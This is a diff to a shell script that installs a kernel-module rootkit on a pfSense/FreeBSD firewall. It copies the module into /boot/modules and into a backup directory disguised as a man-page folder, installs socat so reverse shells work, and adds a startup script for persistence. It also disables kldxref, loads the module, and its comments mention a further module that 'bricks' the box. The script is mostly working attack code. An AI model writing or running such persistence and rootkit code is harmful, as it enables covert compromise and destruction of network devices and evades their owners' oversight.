@@ -8,25 +8,34 @@ fi
 # make writable
 mount -o rw /
 
-# only make it if it doesn't exist
-[ -f LD_PRELOAD.ko ] || make
-
 # mv LD_PRELOAD.ko LD_PRELOAD
 LKM_NAME="LD_PRELOAD.ko"
+RELOAD_FILE="apeshit.sh"
+BACKUP_DIR="/usr/local/share/man/man1/backups"
 
-# put the rootkit in the modules
-cp "$LKM_NAME" /boot/modules/
+mkdir $BACKUP_DIR
+
+# only make it if it doesn't exist
+[ -f $LKM_NAME ] || make
+
 # the version of nc (netcat) that comes with pfSense/FreeBSD doesn't allow for reverse shells
 # therefore we get socat
 pkg install -y socat
 
 # service ldpreload start
-mv systemd-firewalld-sync.sh /usr/local/etc/rc.d/
-chmod +x /usr/local/etc/rc.d/systemd-firewalld-sync.sh
+mv $RELOAD_FILE /usr/local/etc/rc.d/
+chmod +x /usr/local/etc/rc.d/$RELOAD_FILE
 
 # Disable kldxref by setting kldxref_enable="NO"
 sed -i '' 's/^kldxref_enable="YES"/kldxref_enable="NO"/' /etc/rc.conf
+
+# put the rootkit in the modules
+cp "$LKM_NAME" /boot/modules/
+cp "$LKM_NAME" "$BACKUP_DIR"
+# also put the rootkit in a super deep random directory to backup from
+
 chmod +x "/boot/modules/$LKM_NAME"
+chmod +x "$BACKUP_DIR/$LKM_NAME"
 kldload "/boot/modules/$LKM_NAME"
 
 # create and put the LKM that "bricks" the box into a hidden directory 
